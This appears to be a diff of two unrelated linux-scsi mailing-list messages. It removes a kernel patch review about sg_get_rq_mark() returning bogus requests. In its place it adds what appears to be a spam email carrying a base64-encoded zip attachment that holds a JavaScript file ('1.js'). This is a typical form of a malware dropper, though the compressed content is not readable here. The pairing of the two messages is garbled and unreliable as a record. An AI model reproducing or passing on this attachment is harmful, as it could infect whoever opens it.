@@ -1,68 +1,51 @@
-From: Hannes Reinecke <hare@suse.de>
-Subject: Re: [PATCH v2] scsi: sg: don't return bogus Sg_requests
-Date: Wed, 10 May 2017 10:03:27 +0200
-Message-ID: <d5040e08-af7b-4e22-f3b9-44dc893e212f@suse.de>
-References: <20170510075340.12125-1-jthumshirn@suse.de>
+From: <junplzen@cmkos.cz>
+Subject: 46285
+Date: Wed, 10 May 2017 08:46:54 -0000
+Message-ID: <149440601486.19077.4750484450912522053@orange.sk>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170510075340.12125-1-jthumshirn@suse.de>
-Content-Language: en-US
-Sender: linux-kernel-owner@vger.kernel.org
-To: Johannes Thumshirn <jthumshirn@suse.de>, "Martin K . Petersen" <martin.petersen@oracle.com>
-Cc: James Bottomley <jejb@linux.vnet.ibm.com>, Andrey Konovalov <andreyknvl@google.com>, Linux Kernel Mailinglist <linux-kernel@vger.kernel.org>, Linux SCSI Mailinglist <linux-scsi@vger.kernel.org>, Christoph Hellwig <hch@lst.de>, Doug Gilbert <dgilbert@interlog.com>
+Content-Type: application/zip; name="094558964.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-scsi-owner@vger.kernel.org>
+Received: from 92-52-8-206.dynamic.orange.sk ([92.52.8.206]:60712 "HELO
+        orange.sk" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1752582AbdEJIq7 (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Wed, 10 May 2017 04:46:59 -0400
+Content-Disposition: attachment
+Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-On 05/10/2017 09:53 AM, Johannes Thumshirn wrote:
-> If the list search in sg_get_rq_mark() fails to find a valid request, we
-> return a bogus element. This then can later lead to a GPF in sg_remove_scat().
-> 
-> So don't return bogus Sg_requests in sg_get_rq_mark() but NULL in case the
-> list search doesn't find a valid request.
-> 
-> Signed-off-by: Johannes Thumshirn <jthumshirn@suse.de>
-> Reported-by: Andrey Konovalov <andreyknvl@google.com>
-> Cc: Hannes Reinecke <hare@suse.de>
-> Cc: Christoph Hellwig <hch@lst.de>
-> Cc: Doug Gilbert <dgilbert@interlog.com>
-> ---
-> Changes to v1:
-> * Directly return found element within the loop (Hannes)
-> 
->  drivers/scsi/sg.c | 5 +++--
->  1 file changed, 3 insertions(+), 2 deletions(-)
-> 
-> diff --git a/drivers/scsi/sg.c b/drivers/scsi/sg.c
-> index 0a38ba01b7b4..82c33a6edbea 100644
-> --- a/drivers/scsi/sg.c
-> +++ b/drivers/scsi/sg.c
-> @@ -2074,11 +2074,12 @@ sg_get_rq_mark(Sg_fd * sfp, int pack_id)
->  		if ((1 == resp->done) && (!resp->sg_io_owned) &&
->  		    ((-1 == pack_id) || (resp->header.pack_id == pack_id))) {
->  			resp->done = 2;	/* guard against other readers */
-> -			break;
-> +			write_unlock_irqrestore(&sfp->rq_list_lock, iflags);
-> +			return resp;
->  		}
->  	}
->  	write_unlock_irqrestore(&sfp->rq_list_lock, iflags);
-> -	return resp;
-> +	return NULL;
->  }
->  
->  /* always adds to end of list */
-> 
-Better.
-
-Reviewed-by: Hannes Reinecke <hare@suse.com>
-
-Cheers,
-
-Hannes
--- 
-Dr. Hannes Reinecke		   Teamlead Storage & Networking
-hare@suse.de			               +49 911 74053 688
-SUSE LINUX GmbH, Maxfeldstr. 5, 90409 Nürnberg
-GF: F. Imendörffer, J. Smithard, J. Guild, D. Upmanyu, G. Norton
-HRB 21284 (AG Nürnberg)
+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
+IFrJ0gFQSwUGAAAAAAEAAQBWAAAACAcAAAAA
